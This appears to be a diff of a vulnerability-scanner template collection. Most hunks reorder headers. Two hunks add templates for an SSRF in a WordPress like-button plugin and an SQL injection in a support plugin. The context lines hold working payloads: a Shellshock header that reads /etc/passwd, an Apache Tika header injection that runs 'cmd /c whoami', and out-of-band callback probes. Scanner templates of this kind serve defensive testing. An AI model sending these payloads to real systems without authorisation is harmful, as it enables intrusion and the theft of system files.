@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6756,11 +6756,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10304,8 +10304,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -14639,6 +14639,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24150",
+      "info": {
+        "name": "Like Button Rating < 2.6.32 - Unauthenticated Full-Read SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nGET /wp-admin/admin-ajax.php?action=likebtn_prx&likebtn_q={{base64('http://likebtn.com.interact.sh')}}\" HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -19463,6 +19477,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php/interact.sh"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0781",
+      "info": {
+        "name": "Nirweb support < 2.8.2 - Unauthenticated SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL-- -\n"
           ]
         }
       ]
